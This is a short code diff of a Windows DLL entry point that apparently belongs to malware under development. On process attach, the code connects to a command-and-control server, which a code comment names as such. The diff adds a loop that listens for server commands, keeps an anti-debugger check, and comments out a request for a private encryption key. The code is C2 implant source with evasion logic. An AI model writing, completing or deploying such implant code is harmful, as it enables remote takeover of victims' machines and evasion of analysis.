@@ -35,14 +35,19 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	switch ( ul_reason_for_call )
 	{
 	case DLL_PROCESS_ATTACH:		
-		Client me;
+		std::unique_ptr<Client> me = std::make_unique<Client>();
 
 		// try to connect to c2 server
-		if ( !me.Connect() )
-			me.~Client();
+		if ( !me->Connect() )
+			me->~Client();
 
-		ClientRequest req(ClientRequest::kRequestPrivateEncryptionKey);
-		me.MakeTCPRequest(req, TRUE);
+		OutputDebugStringA("connected");
+
+		//ClientRequest req(ClientRequest::kRequestPrivateEncryptionKey);
+		//me->MakeTCPRequest(req, TRUE);
+		OutputDebugStringA("good");
+		me->ListenForServerCommands();
+
 
 		ProcessManager mgr;
 		mgr.CheckNoDebugger();
@@ -69,7 +74,9 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 		);
 
 
-		me.Disconnect();
+		while ( 1 ) {
+			Sleep(1000);
+		}
 
 		break;
 	}
